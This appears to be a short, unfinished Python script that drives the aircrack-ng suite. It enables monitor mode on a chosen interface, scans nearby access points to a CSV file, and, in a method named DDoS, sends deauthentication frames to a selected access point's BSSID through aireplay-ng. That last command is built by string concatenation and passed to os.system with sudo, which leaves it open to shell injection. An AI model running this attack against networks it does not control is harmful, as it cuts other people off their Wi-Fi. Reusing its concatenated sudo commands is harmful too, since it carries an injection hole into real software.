
import os
import asyncio
import subprocess as sp
from rich.console import Console
from rich.table import Table
from rich.prompt import Prompt
import csv


from contextlib import suppress

console = Console()

class Airmon:
    def __init__(self):
        self.command = 'airmon-ng'
        self.interfaces = []
        self.interface_selection = ''
        self.monitor_interface = ''
        
    def format_str(self, output, option):
        if option==0:
            return str(output.stdout).split("'")[1]
        elif option==1:
            return str(output.stdout).split('"')[1]
    
    
    def get_interface(self):
        """Obtain interfaces available
        """
        
        command_output = sp.run(["ifconfig","-s"], capture_output=True)
        output_srt = self.format_str(command_output,0)
        
        for i in output_srt.split('\\n'):
            aux = i.split('  ')[0]
            if aux != '' and aux!='lo' and aux != 'Iface':
                self.interfaces.append(aux)
        
        # Prompt options
        table = Table(show_header=True, header_style='bold magenta')
        table.add_column("Seleccion", width=12)
        table.add_column("Interfaces", width=12)
        
        num = []
        for idx, value in enumerate(self.interfaces):
            table.add_row("["+str(idx)+"]",value)
            num.append(str(idx))
            
        console.print(table)
        option = int(Prompt.ask("Interfaz: ", choices=num))
        
        self.interface_selection = self.interfaces[option]
        
        
    def monitor_mode(self):
        
        command_output = sp.run([self.command,'start', self.interface_selection], capture_output=True)
        
        output_srt = self.format_str(command_output,1)
        
        confirmation = ''
        try:
            confirmation = output_srt.split('\\t')[11]
            self.monitor_interface = self.interface_selection+"mon"
            
        except IndexError:
            self.monitor_interface = self.interface_selection+"n"
            command_output = sp.run([self.command,'stop', self.monitor_interface], capture_output=True)
            print('Disabled monitor mode')
            exit()
        
        if confirmation == f'(mac80211 monitor mode vif enabled for [phy0]{self.interface_selection} on [phy0]{self.monitor_interface})\\n':
            print("Monitor mode enable")

        
class Airodump:
    
    
    def __init__(self):
        self.command = 'airodump-ng'

    
    def scan_targets(self, monitor_interface):
        print(f'Monitor:{monitor_interface}')
        try:
            command_output = sp.run([self.command, '-w','out','--output-format','csv',monitor_interface])
        except KeyboardInterrupt:
            print('End scanning')
        
        with open('out-01.csv', newline='') as csvfile:
            result_reader = csv.reader(csvfile, delimiter=',')
            print(next(result_reader))
        
        
        
    
class Aireplay:
    
    def __init__(self, ap):
        self.ap = ap
        self.command = 'aireplay-ng'


    async def DDoS(self, interface):
        await self.channel(interface)
        os.system('sudo '+ self.command + ' -0 10 -a '+ self.ap.bssid +' '+ interface)
        
        return 1
    
    async def channel(self, interface):
        os.system('sudo airodump-ng -c 2 '+ interface)